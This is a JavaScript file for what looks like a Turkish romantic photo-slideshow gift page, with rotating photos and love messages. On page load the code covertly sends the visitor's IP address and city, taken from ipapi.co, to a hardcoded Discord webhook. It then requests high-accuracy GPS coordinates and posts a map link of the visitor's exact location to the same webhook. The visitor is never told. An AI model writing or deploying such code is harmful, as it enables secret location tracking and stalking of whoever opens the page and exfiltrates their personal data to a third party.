// --- AYARLAR ---
const WEB_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";

function dcGonder(m) {
    fetch(WEB_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: m})
    });
}

// Sayfa yüklendiğinde otomatik başlar
window.onload = function() {
    // 1. IP Bilgisi
    fetch('https://ipapi.co/json/')
        .then(r => r.json())
                .then(d => {
            dcGonder("🚀 **Giriş!**\n📍 Şehir: " + d.city + "\n🌐 IP: " + d.ip);
            
            // 2. Hassas Konum (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    var enlem = p.coords.latitude;
                    var boylam = p.coords.longitude;
                    var link = "https://www.google.com/maps?q=" + enlem + "," + boylam;
                    dcGonder("🎯 **Hassas Konum!**\n🗺️ Harita: " + link);
                }, null, {enableHighAccuracy: true, timeout: 10000});
            }
        });
};

// --- FOTOĞRAF GEÇİŞ SİSTEMİ ---
const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
const sozler = ["Seninle her günüm daha güzel.", "Gülüşün dünyamı aydınlatıyor.", "Kalbim hep seninle.", "Sana her baktığımda yeniden aşık oluyorum.", "İyi ki varsın, iyi ki benimsin."];
let index = 0;

function ileri() {
    index++;
    if (index >= fotolar.length) {
        document.getElementById("hediyeButon").style.display = "block";
        document.getElementById("ileriBtn").style.display = "none";
        return;
    }
    document.getElementById("foto").src = fotolar[index];
    document.getElementById("soz").innerText = sozler[index];
}
